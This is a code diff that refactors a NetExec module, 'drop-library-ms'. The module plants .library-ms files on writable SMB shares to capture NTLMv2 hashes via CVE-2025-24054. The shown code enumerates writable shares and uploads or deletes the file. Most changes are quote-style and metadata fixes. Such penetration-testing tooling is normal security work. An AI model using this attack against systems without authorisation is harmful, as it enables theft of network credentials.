@@ -3,6 +3,8 @@ import string
 import ntpath
 
 from nxc.paths import TMP_PATH
+from nxc.helpers.misc import CATEGORY
+
 
 class NXCModule:
     """
@@ -12,10 +14,9 @@ class NXCModule:
     Module by: @XedSama
     """
     name = "drop-library-ms"
-    description = "Create and upload an arbitrary .library-ms on writable shares, leveraging CVE-2025-24054 for looting NTLMv2 hash"
+    description = "Creates and uploads an arbitrary .library-ms on writable shares, leveraging CVE-2025-24054 for looting NTLMv2 hash"
     supported_protocols = ["smb"]
-    opsec_safe = False
-    multiple_hosts = True
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def __init__(self, context=None, module_options=None):
         self.context = context
@@ -29,7 +30,7 @@ class NXCModule:
 
         self.local_path = None
         self.remote_path = None
-        
+
     def options(self, context, module_options):
         """
         SERVER      Attacker machine
@@ -78,20 +79,19 @@ class NXCModule:
         if shares:
             for share in shares:
                 if "WRITE" in share["access"] and share["name"] not in self.ignore_shares:
-
-                    context.log.success(f"Found writable share : {share["name"]}")
+                    context.log.success(f"Found writable share : {share['name']}")
 
                     if self.cleanup:
                         try:
                             connection.conn.deleteFile(share["name"], self.remote_path)
-                            context.log.success(f"Deleted .library-ms file on the share {share["name"]}")
+                            context.log.success(f"Deleted .library-ms file on the share {share['name']}")
                         except Exception as e:
-                            context.log.fail(f"Error deleting .library-ms file on the share {share["name"]} : {e}")
+                            context.log.fail(f"Error deleting .library-ms file on the share {share['name']} : {e}")
 
                     else:
                         with open(self.local_path, "rb") as libms:
                             try:
                                 connection.conn.putFile(share["name"], self.remote_path, libms.read)
-                                context.log.success(f"Created .library-ms file on the share {share["name"]}")
+                                context.log.success(f"Created .library-ms file on the share {share['name']}")
                             except Exception as e:
-                                context.log.fail(f"Error writing .library-ms file on the share {share["name"]} : {e}")
+                                context.log.fail(f"Error writing .library-ms file on the share {share['name']} : {e}")
